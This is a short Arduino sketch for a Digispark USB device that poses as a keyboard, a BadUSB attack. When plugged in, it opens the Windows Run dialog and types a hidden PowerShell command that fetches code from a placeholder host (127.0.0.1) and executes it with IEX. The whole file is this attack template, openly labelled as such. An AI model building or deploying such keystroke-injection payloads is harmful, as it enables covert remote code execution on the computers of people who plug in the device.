#include "DigiKeyboard.h"

// Attack Header
#define HEADER "PowerShell -WindowStyle Hidden \"&{"

// Attack payload
// Note that this payload shouldn't exceeds 224 characters, the lesser the better.
#define PAYLOAD "IEX $(curl 127.0.0.1).Content"

#define TAILER "}\""

void setup() {
  // Sending the compose key: Win+R.
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  // Delay a little bit, make sure the Run window is correctly started.
  DigiKeyboard.delay(150);
  // Run!
  DigiKeyboard.println(HEADER PAYLOAD TAILER);
}

void loop() {
  // Telling the computer that I'm still alive
  while (1)
    DigiKeyboard.update();
}
